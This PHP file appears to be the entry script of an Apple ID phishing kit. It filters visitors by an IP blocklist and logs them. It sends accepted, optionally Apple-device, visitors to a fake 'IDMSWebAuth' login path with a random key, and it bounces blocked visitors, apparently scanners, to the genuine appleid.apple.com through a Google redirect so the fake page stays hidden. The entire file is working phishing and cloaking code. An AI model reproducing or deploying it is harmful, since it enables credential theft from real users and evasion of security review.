<?php

require_once("assets/includes/functions.php");
@require $_SERVER['DOCUMENT_ROOT']."/setting.php";
$ips = array(	$_SERVER['REMOTE_ADDR'], );
$checklist = new IpBlockList( );
foreach ($ips as $ip ) {
	$result = $checklist->ipPass( $ip );
	if ( $result ) {
		$msg = "PASSED: ".$checklist->message();
        $fp = fopen("assets/logs/accepted_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);		
		session_start();
        $_SESSION['page_a_visited'] = true;
        $rand = sha1(rand(1,99999999999));
        $domain = "https://$_SERVER[SERVER_NAME]";
   $detect_ua 	= strtolower( $_SERVER['HTTP_USER_AGENT'] );
   if($user_allow == "true"){
        if(!preg_match("/os x|macintosh|mac|ipod|ipad|iphone/", $detect_ua)){
        redirectTo("$domain");
        }else{
            	redirectTo("$domain/IDMSWebAuth?appIdKey=$rand");
	     }
   }else{
      redirectTo("$domain/IDMSWebAuth?appIdKey=$rand"); 
   }
        }

	else {
		$msg = "FAILED: ".$checklist->message();
		$fp = fopen("assets/logs/denied_visitors.txt", "a");
        fputs($fp, "IP: $v_ip - DATE: $v_date - BROWSER: $v_agent\r\n");
        fclose($fp);
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();
	}
}
?>